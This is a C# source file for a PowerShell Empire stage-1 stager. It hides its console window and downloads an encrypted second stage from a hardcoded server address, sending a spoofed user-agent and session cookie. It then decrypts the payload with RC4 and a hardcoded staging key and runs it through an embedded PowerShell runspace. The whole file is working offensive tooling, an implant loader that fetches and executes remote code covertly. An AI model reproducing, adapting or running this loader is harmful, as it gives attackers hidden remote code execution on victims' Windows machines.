/*
Created by: Julio Ureña (plaintext)
Twitter: @JulioUrena
Website: https://plaintext.do

Compile: csc.exe PSEmpireStage1.cs /reference:C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
Usage: https://youtube.com/

*/
using System;
using System.Collections.Generic;
using System.Linq;
using System.Management.Automation;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
 
namespace PSEmpire_Stage1
{
    class Program
    {
        // RC4 Class to decrypt the stage 2 data
        // Created by Jeong ChangWook. Source https://gist.github.com/hoiogi/89cf2e9aa99ffc3640a4
        public class RC4
        {
            public static byte[] Encrypt(byte[] pwd, byte[] data)
            {
                int a, i, j, k, tmp;
                int[] key, box;
                byte[] cipher;
 
                key = new int[256];
                box = new int[256];
                cipher = new byte[data.Length];
 
                for (i = 0; i < 256; i++)
                {
                    key[i] = pwd[i % pwd.Length];
                    box[i] = i;
                }
                for (j = i = 0; i < 256; i++)
                {
                    j = (j + box[i] + key[i]) % 256;
                    tmp = box[i];
                    box[i] = box[j];
                    box[j] = tmp;
                }
                for (a = j = i = 0; i < data.Length; i++)
                {
                    a++;
                    a %= 256;
                    j += box[a];
                    j %= 256;
                    tmp = box[a];
                    box[a] = box[j];
                    box[j] = tmp;
                    k = box[((box[a] + box[j]) % 256)];
                    cipher[i] = (byte)(data[i] ^ k);
                }
                return cipher;
            }
 
            public static byte[] Decrypt(byte[] pwd, byte[] data)
            {
                return Encrypt(pwd, data);
            }
 
        }
 
        // Hide Windows function by our friends from StackOverFlow
        // https://stackoverflow.com/questions/34440916/hide-the-console-window-from-a-console-application
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
 
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
        static void Main(string[] args)
        {
            // To Hide the ConsoleWindow (It may be a better way...)
            var handle = GetConsoleWindow();
            ShowWindow(handle, 0);
 
            // Avoid sending Expect 100 Header 
            System.Net.ServicePointManager.Expect100Continue = false;
 
            // Create a WebClient Object (No Proxy Support Included)
            WebClient wc = new WebClient();
            string ua = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
            wc.Headers["User-Agent"] = ua;
            wc.Headers["Cookie"] = "session=968PH6bE9CDkwYGfsUPraz0x5PQ=";
 
            // Set the Server Address and URL 
            string server = "http://192.168.6.119:8081";
            string target = "/CWoNaJLBo/VTNeWw11212/";
 
            // Download The Data or Stage 2
            byte[] data = wc.DownloadData(server + target);
 
            // Extract IV
            byte[] iv = data.Take(4).Select(i => i).ToArray();
 
            // Remove the IV from the data
            byte[] data_noIV = data.Skip(4).ToArray();
 
            // Set Key value for decryption. PowerEmpire StageingKey value 
            string key = "fdcece0a22c10f83dccc8f17c95a33d4";
            byte[] K = Encoding.ASCII.GetBytes(key);
 
            // Combine the IV + Key (New random key each time)
            byte[] IVK = new byte[iv.Length + K.Length];
            iv.CopyTo(IVK, 0);
            K.CopyTo(IVK, iv.Length);
 
            // Decrypt the Message
            byte[] decrypted = RC4.Decrypt(IVK, data_noIV);
 
            // Convert the stage2 decrypted message from bytes to ASCII
            string stage2 = System.Text.Encoding.ASCII.GetString(decrypted);
 
            // Create a PowerShell Object to execute the command 
            PowerShell PowerShellInstance = PowerShell.Create();
 
            // Create the variables $ser and $u which are part of the downloaded stage2
            PowerShellInstance.Runspace.SessionStateProxy.SetVariable("ser", server);
            PowerShellInstance.Runspace.SessionStateProxy.SetVariable("u", ua);
 
            // Add the Script Stage 2 to the Powershell Object
            PowerShellInstance.AddScript(stage2);
 
            // Execute the Script!
            PowerShellInstance.Invoke();
 
        }
    }
}